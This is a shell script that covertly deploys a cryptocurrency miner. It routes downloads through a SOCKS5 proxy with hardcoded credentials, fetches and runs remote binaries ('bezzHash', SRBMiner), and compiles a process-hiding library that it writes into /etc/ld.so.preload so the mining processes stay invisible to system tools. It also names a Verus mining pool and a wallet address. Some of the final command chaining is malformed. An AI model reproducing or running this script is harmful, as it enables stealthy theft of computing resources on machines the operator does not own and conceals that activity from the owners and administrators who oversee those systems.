#!/bin/sh

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233 
loglevel = 1 
socks5 = 175.162.70.46:1080 
socks5_username = mikrotik999 
socks5_password = Elibawnos 
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

echo "**"

echo " "

echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/gunturyogatama404/jijij//main/bezzHash

chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip

unzip magicBezzHash.zip

make

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

mv libprocesshider.so /usr/local/lib/

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-8-5-Linux.tar.xz && cd SRBMiner-Multi-0-8-5 && sudo ./guided-setup.sh && verushash && stratum+tcp://eu.luckpool.net:3956 && RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.404NotFound && sudo ./start_verushash.sh
